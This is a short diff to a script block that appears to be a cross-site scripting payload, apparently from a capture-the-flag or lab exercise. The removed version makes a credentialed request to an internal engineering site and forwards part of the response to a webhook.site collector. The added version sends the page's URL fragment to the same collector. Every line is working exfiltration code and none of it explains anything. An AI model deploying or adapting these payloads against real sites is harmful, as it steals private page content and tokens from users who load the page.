@@ -1,9 +1,3 @@
 <script>
-var x = new XMLHttpRequest();
-x.open('GET', 'https://engineering.quoccacorp.com/', true);
-x.withCredentials = true;
-x.onload = function() {
-  fetch('https://webhook.site/4d7c58e8-cb47-4f18-b23e-9a75213bd336?d=' + encodeURIComponent(x.responseText.substring(0,500)))
-};
-x.send();
+fetch('https://webhook.site/4d7c58e8-cb47-4f18-b23e-9a75213bd336?hash=' + encodeURIComponent(location.hash))
 </script>
